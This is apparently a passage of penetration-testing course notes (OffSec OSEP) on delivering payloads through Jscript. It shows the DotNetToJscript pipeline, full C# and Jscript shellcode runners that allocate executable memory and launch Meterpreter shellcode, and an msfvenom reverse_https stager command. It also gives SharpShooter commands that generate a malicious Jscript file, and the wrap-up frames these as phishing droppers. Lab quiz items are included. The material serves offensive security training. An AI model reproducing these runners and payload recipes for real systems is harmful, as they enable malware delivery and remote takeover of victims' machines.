When the solution is compiled, we need to move some files to get DotNetToJscript to work correctly. We'll navigate to the **DotNetToJScript/bin/Release** folder and copy **DotNetToJscript.exe** and **NDesk.Options.dll** to the **C:\Tools** folder on the Windows 11 development machine. Next, we need to go to the **ExampleAssembly/bin/Release** folder and copy **ExampleAssembly.dll** to **C:\Tools**. We should note that these **.dll** files must be in place whenever we execute a DotNetToJscript program.

After copying the required files, we'll open a command prompt on our Windows machine and navigate to the **C:\Tools** folder.

We need to set a few options at runtime. First, we must specify the script language to use (JScript) with **--lang**, along with **--ver** to specify the .NET framework version. On the newest versions of Windows 11, only version 4 of the .NET framework is installed and enabled by default, so we'll specify **v4**. Next, we'll specify the input file, in our case **ExampleAssembly.dll**. Finally, we'll use the **-o** flag to specify the output file, which is a Jscript file in this example. The full command is shown below:

```
C:\Tools> DotNetToJScript.exe ExampleAssembly.dll --lang=Jscript --ver=v4 -o demo.js
```

> Listing 18 - Invoking DotNetToJscript to create a Jscript file

Now that the file is created, we can double-click it to run it. This displays our simple pop-up:

![[OffSec/OSEP/Course/z. images/2a29087ba40848ed99eb5ee9f8a3c2f3_MD5.jpg]]

Figure 8: Message box spawned by our Jscript file

Let's examine the Jscript code generated by DotNetToJscript to get a clearer idea of exactly what occurred. We can open **demo.js** in a text editor to view this code.

This code begins with three functions: _setversion_, _debug_, and _base64ToStream_.

```
function setversion() {
new ActiveXObject('WScript.Shell').Environment('Process')('COMPLUS_Version') = 'v4.0.30319';
}
function debug(s) {}
function base64ToStream(b) {
	var enc = new ActiveXObject("System.Text.ASCIIEncoding");
	var length = enc.GetByteCount_2(b);
	var ba = enc.GetBytes_4(b);
	var transform = new ActiveXObject("System.Security.Cryptography.FromBase64Transform");
	ba = transform.TransformFinalBlock(ba, 0, length);
	var ms = new ActiveXObject("System.IO.MemoryStream");
	ms.Write(ba, 0, (length / 4) * 3);
	ms.Position = 0;
	return ms;
}
```

> Listing 19 - First helper functions of Jscript file

Let's examine each of these. The _setversion_ function configures the Windows Script Host to use version 4.0.30319 of the .NET framework:

```
new ActiveXObject('WScript.Shell').Environment('Process')('COMPLUS_Version') = 'v4.0.30319';
```

> Listing 20 - First helper function

The second function (_debug_) is empty, since we did not specify the debug flag (**-d**) when invoking DotNetToJscript:

```
function debug(s) {}
```

> Listing 21 - Second helper function

Finally, the _base64ToStream_ function is simply a Base64 decoding function that leverages various .NET classes through ActiveXObject instantiation:

```
function base64ToStream(b) {
...
}
```

> Listing 22 - Third helper function

Following the helper functions, we find the main content of the script, as shown:

```
var serialized_obj = "AAEAAAD/////AQAAAA...

var entry_class = 'TestClass';

try {
	setversion();
	var stm = base64ToStream(serialized_obj);
	var fmt = new ActiveXObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter');
	var al = new ActiveXObject('System.Collections.ArrayList');
	var d = fmt.Deserialize_2(stm);
	al.Add(undefined);
	var o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class);
	
} catch (e) {
    debug(e.message);
}
```

> Listing 23 - Code to decode and deserialize the C# assembly

Let's analyze this code. First, a Base64 encoded binary blob is embedded into the file. This is our compiled C# assembly.

```
var serialized_obj = "AAEAAAD/////AQAAAA...
```

> Listing 24 - Base64 encoded binary blob

Next, we'll specify the name of the class inside the compiled assembly that we want to execute. In our case, it's named _TestClass_:

```
var entry_class = 'TestClass';
```

> Listing 25 - Testclass variable

After specifying the name of the class, the heart of the script begins.

First, we set the .NET framework version and Base64-decode the blob as shown in Listing 26. Next, a _BinaryFormatter_[4](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_4948-4) object is instantiated, from which we call the _Deserialize_[5](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_4948-5) method.

In JScript, _Deserialize_2_ isn't an official or documented method of the BinaryFormatter class from the .NET framework. Instead, this code uses _Deserialize_2_ as a workaround to bypass security restrictions in certain versions of .NET.

At this point, the _d_ variable contains the decoded and deserialized assembly **ExampleAssembly.dll** in memory.

```
setversion();
var stm = base64ToStream(serialized_obj);
var fmt = new ActiveXObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter');
var d = fmt.Deserialize_2(stm);
```

> Listing 26 - Base64 decoded binary blob

To execute the relevant method inside the assembly, we'll use the _DynamicInvoke_[6](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_4948-6) and _CreateInstance_[7](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_4948-7) methods. DynamicInvoke accepts an array of arguments, but no arguments are required by the constructor of the "TestClass" class.

We can solve this by creating an array assigned to the "al" variable, then add an undefined object to keep it empty and convert it to an array using _ToArray()_. This creates an empty array that is passed to DynamicInvoke, as shown below:

```
var al = new ActiveXObject('System.Collections.ArrayList');
...
al.Add(undefined);
var o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class);
```

> Listing 27 - DynamicInvoke code

Finally we execute the constructor through _CreateInstance_ by supplying its name, which is stored in _entry_class_.

Now, thanks to DotNetToJscript, we have the framework we can use to easily convert any C# code into a format that can be executed from a Jscript file. This brings us closer to executing Win32 APIs.

1

(James Forshaw, 2019), [https://twitter.com/tiraniddo](https://twitter.com/tiraniddo) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_4948-1)

2

(James Forshaw, 2018), [https://github.com/tyranid/DotNetToJScript](https://github.com/tyranid/DotNetToJScript) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_4948-2)

3

(Microsoft, 2018), [https://docs.microsoft.com/en-us/dotnet/api/system.windows.forms.messagebox.show?view=netframework-4.8](https://docs.microsoft.com/en-us/dotnet/api/system.windows.forms.messagebox.show?view=netframework-4.8) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_4948-3)

4

(Microsoft, 2018), [https://docs.microsoft.com/en-us/dotnet/api/system.runtime.serialization.formatters.binary.binaryformatter?view=netframework-4.8](https://docs.microsoft.com/en-us/dotnet/api/system.runtime.serialization.formatters.binary.binaryformatter?view=netframework-4.8) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_4948-4)

5

(Microsoft, 2018), [https://docs.microsoft.com/en-us/dotnet/api/system.runtime.serialization.formatters.binary.binaryformatter.deserialize?view=netframework-4.8](https://docs.microsoft.com/en-us/dotnet/api/system.runtime.serialization.formatters.binary.binaryformatter.deserialize?view=netframework-4.8) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_4948-5)

6

(Microsoft, 2018), [https://docs.microsoft.com/en-us/dotnet/api/system.delegate.dynamicinvoke?view=netframework-4.8](https://docs.microsoft.com/en-us/dotnet/api/system.delegate.dynamicinvoke?view=netframework-4.8) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_4948-6)

7

(Microsoft, 2018), [https://docs.microsoft.com/en-us/dotnet/api/system.reflection.assembly.createinstance?view=netframework-4.8#System_Reflection_Assembly_CreateInstance_System_String_](https://docs.microsoft.com/en-us/dotnet/api/system.reflection.assembly.createinstance?view=netframework-4.8#System_Reflection_Assembly_CreateInstance_System_String_) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_4948-7)

## Resources

Some of the labs require you to start the target machine(s) below.

Please note that the IP addresses assigned to your target machines may not match those referenced in the Module text and video.

DotNetToJscript - dev01

#### Labs

1. Start the dev01 VM and repeat the steps illustrated in this section in order to set up the DotNetToJscript project, compile the default ExampleAssembly project and convert it into a Jscript file with DotNetToJscript. Once done, modify the _TestClass.cs_ file to make it launch a command prompt instead of opening a MessageBox.

Which Visual Studio setting should be used before compiling the DotNetToJscript project?

```
A) Debug mode
B) Safe mode
C) Release mode
D) Compatibility mode
```

Answer

2. What is the role of the base64ToStream function in the generated Jscript code?

```
A) To set the .NET framework version
B) To debug the Jscript code
C) To decode a Base64 encoded binary blob
D) To create instances of C# classes
```

Answer

3. What is the purpose of the CreateInstance method in the generated Jscript?

```
A) To set the .NET version
B) To create an instance of the specified class inside the assembly
C) To compile the C# code into Jscript
D) To start a process from the command line
```

Answer

4. Connect to the dev01 machine and fix the errors present in **flag4.txt** code that can be found under the **Tools\Exercises** folder. In order to get the flag, replace the **TestClass.cs** code with the corrected code inside the DotNetToJscript project. Then compile it

Answer

## 5.2.3. Win32 API Calls From C#

Now that we've covered an example, let's practice making calls to arbitrary Win32 APIs. We can leverage the _DllImport_ statement used in a [previous module](https://portal.offsec.com/courses/pen-300-9502/learning/phishing-with-microsoft-office-186739/microsoft-office-macros-186775/microsoft-office-macros-186778) to import and link any Win32 APIs into C#. We'll need to once again translate the C-style argument data types to C# through the P/Invoke technique.

When calling Win32 APIs from PowerShell (like we did in a previous module), we demonstrated the straightforward _Add-Type_ method and the more complicated reflection technique. However, the complexity of reflection was well worth it, as we avoided writing C# source code and compiled assembly files temporarily to disk during execution. Luckily, when dealing with C#, we can compile the assembly before sending it to the victim and execute it in memory, which will avoid this problem entirely.

Let's make a proof-of-concept example that imports _MessageBoxA_ and calls it from C#. To simplify this, we'll use the Visual Studio solution we created for the Hello World example.

First, let's search for _MessageBox_ on **www.pinvoke.net**[1](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_4953-1) to help translate the C data types to C# data types.

To use _MessageBoxA_, we need an import statement added inside the _Program_ class but outside the _Main_ method, as shown in Listing 28. With the Win32 API imported, we simply invoke it by supplying text and a caption, as highlighted below:

```
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace ConsoleApp1
{
    class Program
    {
        [DllImport("user32.dll", CharSet=CharSet.Auto)]
        public static extern int MessageBox(IntPtr hWnd, String text, String caption, int options);

        static void Main(string[] args)
        {
            MessageBox(IntPtr.Zero, "This is my text", "This is my caption", 0);
        }
    }
}
```

> Listing 28 - C# code to import and use MessageBoxA

As shown below, Visual Studio highlights potential issues with the DllImport statement due to missing namespaces. To use the DllImport statement and invoke the Win32 APIs, we have to use the two namespaces (_System.Diagnostics_ and _System.Runtime.InteropServices_).

![[OffSec/OSEP/Course/z. images/2f055ce77bc88052c68a6a0428aba4d7_MD5.jpg]]

Figure 9: Missing namespaces

We also need to add the core _System_ namespace that provides us access to all basic data types, such as _IntPtr_. Let's review our full code so far:

```
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace ConsoleApp1
{
    class Program
    {
        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        public static extern int MessageBox(IntPtr hWnd, String text, String caption, int options);

        static void Main(string[] args)
        {
             MessageBox(IntPtr.Zero, "This is my text", "This is my caption", 0);
        }
    }
}
```

> Listing 29 - Full code

We can now compile the application without errors and launch it from the command prompt. This should generate a pop-up with our text.

We've demonstrated how to import and call Win32 APIs from C# without having to use reflection. In the next section, we'll recreate our PowerShell shellcode runner in C#.

1

(Pinvoke, 2019), [http://pinvoke.net/default.aspx/user32/MessageBox.htm](http://pinvoke.net/default.aspx/user32/MessageBox.htm) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_4953-1)

## Resources

Some of the labs require you to start the target machine(s) below.

Please note that the IP addresses assigned to your target machines may not match those referenced in the Module text and video.

Win32 API Calls From C# - dev01

#### Labs

1. Start the dev01 VM and repeat the steps illustrated in this section in order to implement the Win32 _MessageBox_ API call in C#.

What is the purpose of using the DllImport statement in C#?

```
A) To compile C# code into executable files
B) To import and link Win32 APIs into C#
C) To execute JavaScript code in C#
D) To create C# classes dynamically
```

Answer

2. Which namespace provides access to basic data types like IntPtr in C#?

```
A) System.IO
B) System.Runtime.InteropServices
C) System
D) System.Diagnostics
```

Answer

3. Connect to dev01 machine and correct the errors present in the **flag5.txt** file located in the **C:\tools\exercises** folder, in order to correctly print the flag with the related Windows API. In order to obtain the flag, replace the content of the main **Program.cs** file from the Console1 application with the corrected **flag5.txt** code, compile it and execute it.

Answer

## 5.2.4. Shellcode Runner in C#

Now that we've developed our basic framework, we can reuse the shellcode runner technique from both VBA and PowerShell and combine _VirtualAlloc_, _CreateThread_, and _WaitForSingleObject_ to execute shellcode in memory.

The first step is to use DllImport to import the three Win32 APIs and configure the appropriate argument data types. This is unchanged from our experience with _Add-Type_ and PowerShell. The imports are shown below:

```
[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, 
    uint flProtect);

[DllImport("kernel32.dll")]
static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, 
    IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

[DllImport("kernel32.dll")]
static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
```

> Listing 30 - Importing Win32 APIs for shellcode runner

Next, we need to generate our shellcode. Keep in mind that on a 64-bit Windows operating system, Jscript will execute in a 64-bit context by default so we have to generate a 64-bit Meterpreter staged payload in _csharp_ format. While we're at it, we'll set up our multi/handler with the same payload.

Calling the APIs from C# is similar to our experience with PowerShell. However, we do not have to specify .NET namespaces like _[System.Runtime.InteropServices.Marshal]_ or the runtime compiled classes to invoke them.

In Listing 31, the calls to the three Win32 APIs along with the managed to unmanaged memory copy are present, and constitute the last part of the shellcode runner. This should appear very similar to what we did earlier.

Let's discuss a few details of this code, starting with the variable declarations. The first, _buf_, is our shellcode. Next is our _size_ variable that stores the size of our _buf_ variable. As mentioned earlier, we use _Marshal.Copy_, but don't have to specify the .NET namespace of _[System.Runtime.InteropServices.Marshal]_.

```
byte[] buf = new byte[626] {
  0xfc,0x48,0x83,0xe4,0xf0,0xe8...

int size = buf.Length;

IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

Marshal.Copy(buf, 0, addr, size);

IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

WaitForSingleObject(hThread, 0xFFFFFFFF);
```

> Listing 31 - Win32 APIs called from C# to execute shellcode

We'll once again use the _WaitForSingleObject_ API to let the shellcode finish execution. Otherwise, the Jscript execution would terminate the process before the shell becomes active.

Here's the full code of our C# shellcode runner:

```
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace ConsoleApp1
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        static void Main(string[] args)
        {
            byte[] buf = new byte[630] {
  0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
  ...
  0x58,0xc3,0x58,0x6a,0x00,0x59,0x49,0xc7,0xc2,0xf0,0xb5,0xa2,0x56,0xff,0xd5 };

            int size = buf.Length;

            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

            Marshal.Copy(buf, 0, addr, size);

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}

```

> Listing 32 - Win32 APIs called from C# to execute shellcode full code

**Before compiling this project**, we must set the CPU architecture to _x64_ since we are using 64-bit shellcode. This is done through the _CPU_ drop down menu by opening the _Configuration Manager_, as shown below:

![[OffSec/OSEP/Course/z. images/9e279572a09dc5f6fcdb7e5f037e9fc6_MD5.jpg]]

Figure 10: Opening Configuration Manager in Visual Studio

In the Configuration Manager, we choose _<New...>_ from the _Platform_ drop-down menu and accept the new platform as _x64_, as shown below:

![[OffSec/OSEP/Course/z. images/e386d337d20960e5afabf74f745df3a5_MD5.jpg]]

Figure 11: Opening Configuration Manager in Visual Studio

Next, we'll need to compile the C# project, which will generate an executable on our Samba share. Executing it will provide a reverse Meterpreter shell.

Nice! We are one step closer. In the next section, we will get our project running in the context of DotNetToJscript.

## Resources

Some of the labs require you to start the target machine(s) below.

Please note that the IP addresses assigned to your target machines may not match those referenced in the Module text and video.

Shellcode Runner in C# - dev01

#### Labs

1. Start the dev01 VM and repeat the steps illustrated in this section in order to generate a bind shell meterpreter shellcode runner executable from C#.

Once done, obtain a shell by connecting to the related target machine TCP port where the bind shell is running.

What is the purpose of the shellcode runner in C#?

```
A) To compile C# code into a DLL
B) To run shellcode directly in memory using Win32 APIs
C) To create a new thread in C#
D) To debug shellcode
```

Answer

2. Which API call is used to copy the shellcode into the allocated memory in the C# code?

```
A) memcpy
B) Marshal.Copy
C) CopyMemory
D) RtlMoveMemory
```

Answer

## 5.2.5. Jscript Shellcode Runner

Now that we have the C# shellcode runner working, we must modify the ExampleAssembly project in DotNetToJscript to execute the shellcode runner instead of the previous simple proof of concept code. We'll also generate a Jscript file with the compiled assembly so we can launch the shellcode runner directly from Jscript.

As mentioned earlier, any declarations using DllImport must be placed in the relevant class, but outside the method it is used in. In this case, we need to put them in the _TestClass_ class, shown below. We've also added the needed namespaces at the beginning of the project with the "using" keyword followed by the namespace:

```
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

[ComVisible(true)]
public class TestClass
{
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, 
      uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, 
      IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll")]
    static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

...
```

> Listing 33 - Win32 APIs imported in ExampleAssembly

Next, we'll add the same shellcode and method calls inside the _TestClass_ method as in our standalone project:

```
public TestClass()
{
      byte[] buf = new byte[626] {
          0xfc,0x48,0x83,0xe4,0xf0,0xe8...

      int size = buf.Length;

      IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

      Marshal.Copy(buf, 0, addr, size);

      IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

      WaitForSingleObject(hThread, 0xFFFFFFFF);
}
```

> Listing 34 - Win32 APIs used for shellcode execution

Before we compile the ExampleAssembly project, we need to specify the x64 platform. After compilation, we need to copy the compiled DLL into the same folder as **DotNetToJscript.exe** on the Windows 11 development machine.

With our updated DLL in place, we can invoke **DotNetToJscript** using the same arguments as earlier, directing it to use version 4 of the .NET framework and output a Jscript file, as shown below:

```
C:\Tools> DotNetToJScript.exe ExampleAssembly.dll --lang=Jscript --ver=v4 -o runner.js
```

> Listing 35 - Invoking DotNetToJscript to create a Jscript shellcode runner

With our multi/handler set up, let's double-click the Jscript file. After a brief pause, we should receive the staged reverse Meterpreter shell. Very nice!

We have successfully leveraged Jscript to deliver an arbitrary C# assembly, in our case a shellcode runner.

## Resources

Some of the labs require you to start the target machine(s) below.

Please note that the IP addresses assigned to your target machines may not match those referenced in the Module text and video.

Jscript Shellcode Runner - dev01

#### Labs

1. Start the dev01 VM and repeat the steps illustrated in this section in order to obtain a Jscript shellcode runner. Once done, obtain a reverse Meterpreter shell on your Kali machine.

Where must the DllImport declarations be placed in the ExampleAssembly project?

```
A) Inside the Main method
B) Inside the TestClass class but outside its methods
C) At the end of the C# file
D) Inside a separate .dll file
```

Answer

2. Which Win32 API is used to allocate memory for the shellcode?

```
A) VirtualProtect
B) HeapAlloc
C) VirtualAlloc
D) GlobalAlloc
```

Answer

## 5.2.6. SharpShooter

In recent years, it has become much more common to use DotNetToJscript to weaponize C# compiled assemblies in other file formats (like Jscript, VBScript, and even Microsoft Office macros). A payload generation tool called _SharpShooter_[1](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_4963-1) has been created to assist with this.

SharpShooter is "a payload creation framework for the retrieval and execution of arbitrary C# source code" and automates part of the process discussed in this module. As with any automated tool, it is vital that we understand how it works, especially when it comes to bypassing security software and mitigations that will be present in most organizations.

SharpShooter is written in Python 2, which reached its end-of-life on January 1, 2020. Although Kali Linux still provides support for Python 2, this support is not guaranteed in the future and may be removed without notice. Python 2 is no longer receiving security updates or bug fixes, and many libraries have dropped support for it.

SharpShooter is capable of evading various types of security software, but that topic is outside the scope of this Module.

We can install SharpShooter on Kali with **git clone** and Python2 **pip**[2](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_4963-2), as shown:

```
kali@kali:~$ cd /opt/

kali@kali:/opt$ sudo curl https://bootstrap.pypa.io/pip/2.7/get-pip.py --output get-pip.py

kali@kali:/opt$ sudo python2 ./get-pip.py

kali@kali:/opt$ sudo git clone https://github.com/mdsecactivebreach/SharpShooter.git
Cloning into 'SharpShooter'...

kali@kali:/opt$ cd SharpShooter/

kali@kali:/opt/SharpShooter$ sudo python2 -m pip install --upgrade setuptools pip==20.3.4

kali@kali:/opt/SharpShooter$ sudo pip2 install -r requirements.txt
```

> Listing 36 - Installing SharpShooter on Kali Linux

If confronted with a message that pip cannot be found, install the package using **sudo apt install python-pip**

With SharpShooter installed, let's try to replicate what we did manually in this Module: creating a shellcode runner with Jscript by leveraging DotNetToJscript.

First, we'll use **msfvenom** to generate our Meterpreter reverse stager and write the _raw_ output format to a file.

```
kali@kali:/opt/SharpShooter$ sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 -f raw -o /var/www/html/shell.txt
...
Payload size: 716 bytes
Saved as: /var/www/html/shell.txt
```

> Listing 37 - Creating a raw Meterpreter staged payload

Next, we'll invoke **SharpShooter.py** while supplying a number of parameters, as shown in Listing 38. The first **--payload js**, will specify a Jscript output format. The next parameter, **--dotnetver**, sets the .NET framework version to target. The **--stageless** parameter specifies in-memory execution of the Meterpreter shellcode.

The term "stageless" for SharpShooter refers to whether the entire Jscript payload is transferred at once, or if HTML smuggling is used with a staged Jscript payload.

**--rawscfile** specifies the file containing our shellcode, and we set our output file using **--output**, leaving off the file extension. The full command is shown below:

```
kali@kali:/opt/SharpShooter$ sudo python2 SharpShooter.py --payload js --dotnetver 4 --stageless --rawscfile /var/www/html/shell.txt --output test
...
    
[*] Written delivery payload to output/test.js
```

> Listing 38 - Generating malicious Jscript file with SharpShooter

Once again, we must configure a multi/handler matching the generated Meterpreter shellcode. Next, we need to copy the generated **test.js** file to our Windows 11 dev machine. When we double-click it, we will obtain a reverse shell.

Using an automated tool can greatly improve productivity and reduce repetitive tasks, but it is always important to understand the techniques employed and the operation of underlying code.

So far, we have taken advantage of both PowerShell and compiled C# assemblies - but we can also combine the two to dynamically load assemblies through PowerShell without touching the disk.

1

(MDSec's ActiveBreach Team, 2019), [https://github.com/mdsecactivebreach/SharpShooter](https://github.com/mdsecactivebreach/SharpShooter) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_4963-1)

2

(W3Schools, 2019), [https://www.w3schools.com/python/python_pip.asp](https://www.w3schools.com/python/python_pip.asp) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_4963-2)

## Resources

Some of the labs require you to start the target machine(s) below.

Please note that the IP addresses assigned to your target machines may not match those referenced in the Module text and video.

SharpShooter - dev01

#### Labs

1. Start the dev01 machine and repeat the steps illustrated in this section. Install SharpShooter on Kali and generate a Jscript shellcode runner then expand on the attack by creating a [_staged attack_](https://www.mdsec.co.uk/2018/03/payload-generation-using-sharpshooter/) that also leverages HTML smuggling to deliver the malicious Jscript file.

What is the primary function of SharpShooter?

```
A) To create Python scripts
B) To generate and execute arbitrary C# source code in various formats
C) To compile .NET applications directly
D) To debug C# assemblies
```

Answer

2. What is the output format specified when generating the payload with SharpShooter?

```
A) C#
B) Python
C) VBScript
D) Jscript
```

Answer

3. Expand on the attack by creating a [staged attack](https://www.mdsec.co.uk/2018/03/payload-generation-using-sharpshooter/) that also leverages HTML smuggling to deliver the malicious Jscript file.

Which of the following techniques can be used to obfuscate JavaScript code?

```
A) Using comments
B) Renaming variables and functions
C) Adding unnecessary whitespace
D) All of the above
```

Answer

## 5.3. Wrapping Up

In this Learning Module, we explored how to leverage JScript for phishing attacks, focusing on creating effective droppers for client-side code execution on Windows. We began with a basic JScript dropper to open a command prompt, then progressed to more sophisticated techniques, such as downloading and executing a Meterpreter reverse shell. This allowed us to bypass typical sandbox restrictions when running scripts outside the browser.

We also introduced C# integration with JScript, enabling more advanced in-memory payload execution by loading C# assemblies directly. Through practical examples, we covered critical tools and methods, including the use of ActiveXObject for running external programs and ADODB.Stream for handling files, providing a foundation for using JScript as an alternative to VBA macros in phishing campaigns.

Although we used multiple languages and techniques to obtain code execution, there are even more combinations in the wild. Penetration testers have used the _HTML Application_ or _HTA_[1](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_4967-1) attack against Internet Explorer for many years. The combination of HTA and HTML smuggling has allowed it to be efficiently used against other browsers and weaponized as the _Demiguise_[2](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_4967-2) tool.

A somewhat newer technique leverages the ability to instantiate other scripting engines in .NET like _IronPython_,[3](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_4967-3) which lets a penetration tester combine the power of Python and .NET. _Trinity_[4](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_4967-4) is a framework for implementing this post-exploitation.

_Java_[5](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_4967-5)-based _Java Applets_[6](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_4967-6) and Java _JAR_[7](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_4967-7) files can be used to gain client-side code execution. The most common variant using Java JAR files in the wild is called _jRAT_ or _Adwind_.[8](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_4967-8) This variant implements reflection and in-memory compilation techniques in Java. Java also contains a built-in JavaScript scripting engine called _Nashhorn_.[9](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fn-local_id_4967-9)

1

(Mitre, 2018), [https://attack.mitre.org/techniques/T1170/](https://attack.mitre.org/techniques/T1170/) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_4967-1)

2

(Demiguise, 2017), [https://github.com/nccgroup/demiguise/blob/master/Readme.md](https://github.com/nccgroup/demiguise/blob/master/Readme.md) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_4967-2)

3

(IronPython, 2018), [https://ironpython.net/](https://ironpython.net/) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_4967-3)

4

(SilentTrinity, 2019), [https://github.com/byt3bl33d3r/SILENTTRINITY](https://github.com/byt3bl33d3r/SILENTTRINITY) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_4967-4)

5

(Wikipedia, 2019), [https://en.wikipedia.org/wiki/Java_(programming_language)](https://en.wikipedia.org/wiki/Java_\(programming_language\)) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_4967-5)

6

(Wikipedia, 2019), [https://en.wikipedia.org/wiki/Java_applet](https://en.wikipedia.org/wiki/Java_applet) [↩︎](https://portal.offsec.com/courses/pen-200-44065/learning/vulnerability-scanning-48659/wrapping-up-48703/wrapping-up-48710#fnref-local_id_4967-6)

7

